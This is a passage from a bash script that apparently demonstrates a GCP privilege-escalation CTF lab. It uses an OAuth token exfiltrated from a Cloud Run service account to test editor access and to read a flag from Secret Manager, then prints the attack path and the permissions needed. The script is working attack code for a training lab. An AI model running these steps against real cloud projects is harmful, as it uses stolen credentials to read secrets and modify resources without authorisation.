    -H "Content-Type: application/json" \
    -d "$UPDATED_PROJECT_JSON" \
    "https://cloudresourcemanager.googleapis.com/v1/projects/${PROJECT_ID}")
PUT_CODE=$(echo "$PUT_RESPONSE" | tail -1)
PUT_BODY=$(echo "$PUT_RESPONSE" | sed '$d')

if [ "$PUT_CODE" = "200" ]; then
    echo -e "${GREEN}✓ Successfully wrote a project label using the exfiltrated token!${NC}"
    echo -e "${GREEN}✓ PROJECT EDITOR ACCESS CONFIRMED (roles/editor)${NC}"
    # Restore the original labels (PUT the pre-change resource back).
    curl -s -X PUT \
        -H "Authorization: Bearer ${EXFILTRATED_TOKEN}" \
        -H "Content-Type: application/json" \
        -d "$CURRENT_PROJECT_JSON" \
        "https://cloudresourcemanager.googleapis.com/v1/projects/${PROJECT_ID}" > /dev/null 2>&1 || true
elif [ "$PUT_CODE" = "403" ]; then
    echo -e "${YELLOW}Note: project label write denied (403) — the stolen token lacks${NC}"
    echo -e "${YELLOW}resourcemanager.projects.update; the flag read below is the primary proof${NC}"
else
    echo -e "${YELLOW}Note: project label write returned HTTP $PUT_CODE${NC}"
    echo "Response: $(echo "$PUT_BODY" | head -3)"
fi
echo ""

# Step 8: [THE ATTACK] Read the CTF flag directly via the Secret Manager REST
# API using the raw stolen bearer token — never re-impersonating via gcloud.
# This is the concrete proof that the exfiltrated token itself is usable
# credential material, not just a demonstration of IAM permissions.
echo -e "${YELLOW}Step 8: [EXPLOIT] Reading the CTF flag with the raw stolen token${NC}"
show_attack_cmd "$TARGET_SA_EMAIL (via exfiltrated token)" \
    "curl -s -H 'Authorization: Bearer <redacted>' 'https://secretmanager.googleapis.com/v1/projects/$PROJECT_ID/secrets/$FLAG_SECRET_ID/versions/latest:access'"

SECRET_RESPONSE=$(curl -s -H "Authorization: Bearer ${EXFILTRATED_TOKEN}" \
    "https://secretmanager.googleapis.com/v1/projects/${PROJECT_ID}/secrets/${FLAG_SECRET_ID}/versions/latest:access")

ENCODED_PAYLOAD=$(echo "$SECRET_RESPONSE" | jq -r '.payload.data // empty')
if [ -z "$ENCODED_PAYLOAD" ]; then
    echo -e "${RED}✗ Failed to read flag via exfiltrated token${NC}"
    echo "Response: $SECRET_RESPONSE"
    exit 1
fi

# base64 decode via openssl for cross-platform (macOS BSD base64 only accepts
# -D, GNU base64 only accepts -d/--decode; openssl's base64 -d is consistent
# on both).
FLAG_VALUE=$(echo "$ENCODED_PAYLOAD" | openssl base64 -d -A)

if [ -z "$FLAG_VALUE" ]; then
    echo -e "${RED}✗ Failed to decode flag payload${NC}"
    exit 1
fi
echo -e "${GREEN}✓ Read Secret Manager secret using target_sa's exfiltrated token${NC}\n"

echo -e "\n${GREEN}========================================${NC}"
echo -e "${GREEN}✅ CTF FLAG CAPTURED!${NC}"
echo -e "${GREEN}========================================${NC}"
echo -e "\n${YELLOW}Flag:${NC} $FLAG_VALUE"

echo -e "\n${YELLOW}Attack Summary:${NC}"
echo "1. ADC identity ($DEPLOYER_EMAIL) acted as $STARTING_SA_EMAIL, which used its"
echo "   run.services.create + actAs grant on $TARGET_SA_EMAIL to deploy a Cloud Run"
echo "   service bound to $TARGET_SA_EMAIL from a PUBLIC Docker Hub image (no Artifact"
echo "   Registry access needed), invoked it to trigger token exfiltration, stole"
echo "   $TARGET_SA_EMAIL's OAuth token from the metadata server via the service logs,"
echo "   and used that raw token to read the CTF flag directly"

echo -e "\n${YELLOW}Attack Path:${NC}"
echo "  $STARTING_SA_EMAIL"
echo "    -> (run.services.create + iam.serviceAccounts.actAs on target_sa — THE VULNERABILITY)"
echo "    -> Cloud Run service '$SERVICE_NAME' deployed and running as $TARGET_SA_EMAIL"
echo "       (image: docker.io/library/python:3.13-slim from public Docker Hub — no Artifact Registry)"
echo "    -> exfiltrated OAuth access token (via metadata server → Cloud Run logs)"
echo "    -> (roles/editor on project $PROJECT_ID)"
echo "    -> CTF Flag"

if [ ${#ATTACK_COMMANDS[@]} -gt 0 ]; then
    echo -e "\n${YELLOW}Key Attack Commands:${NC}"
    for cmd in "${ATTACK_COMMANDS[@]}"; do
        echo -e "  ${CYAN}\$ ${cmd}${NC}"
    done
fi

if $USE_GCLOUD; then
    echo -e "\n${YELLOW}Note on gcloud vs. raw API permissions:${NC}"
    echo "  This demo used 'gcloud run deploy' with --no-allow-unauthenticated, which is the"
    echo "  natural tool for this attack. The verified permission classification"
    echo "  (2026-11-01 leave-one-out isolation run, both modes green):"
    echo ""
    echo "  Required even with the raw API (cr_deploy_req role):"
    echo "    run.services.get       — fetch the service URL and readiness polling"
    echo "    run.operations.get     — poll the async deploy LRO"
    echo "    logging.logEntries.list — reading the exfiltrated token from Cloud Run"
    echo "                            logs (gcloud logging read)"
    echo ""
    echo "  gcloud-only mechanic (cr_deploy_help role, not part of the vulnerability):"
    echo "    run.services.update   — only needed when gcloud re-deploys to the service"
    echo "                            name left by a prior run; a fresh deploy (both"
    echo "                            modes) never takes the update path"
    echo ""
    echo "  Permission confirmed NOT needed (avoided by --no-allow-unauthenticated):"
    echo "    run.services.setIamPolicy  — only needed when making the service public"
    echo "                                (--allow-unauthenticated); we invoke with an"
    echo "                                ID token instead"
    echo "  Permission confirmed NOT needed (public Docker Hub image):"
    echo "    artifactregistry.repositories.downloadArtifacts — only needed when pulling"
    echo "                                the image from Artifact Registry"
    echo ""
    echo "  To see the attack with only the true minimum permissions, run:"
    echo -e "  ${CYAN}\$ ./demo_attack.sh --api-only${NC}"
fi

echo -e "\n${YELLOW}To clean up:${NC} ./cleanup_attack.sh"
echo ""

touch "$SCRIPT_DIR/.demo_active"
DEMO_COMPLETED=true
